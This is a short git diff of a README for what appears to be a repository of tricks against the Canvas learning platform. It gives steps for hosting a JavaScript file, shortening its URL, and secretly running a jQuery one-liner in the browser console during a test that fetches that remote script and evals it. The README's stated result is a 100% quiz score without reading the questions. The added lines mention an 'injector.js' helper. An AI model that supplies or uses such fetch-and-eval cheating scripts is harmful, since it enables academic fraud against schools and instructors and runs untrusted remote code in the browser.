@@ -16,3 +16,6 @@ Discovering different vulnerabilities in Canvas
  5. Map the gist url to a [tiny url](tinyurl.com) to make it easier to memorize.
  6. When taking the test, secretively open the javascript console (see keyboard shortcut above) and type `$.get('url-to-js-file', function(data){eval(data)});` replacing `url-to-js-file` with the tiny url you created previously.
  7. Congrats, you just got 100% on your test or quiz without even looking at it!  \\\(\*O\*)/
+
+**Notes**
+ - `injector.js`: can be used if canvas stops putting jQuery on the quiz pages. I thought that it would be good/fun to have anyway. :P
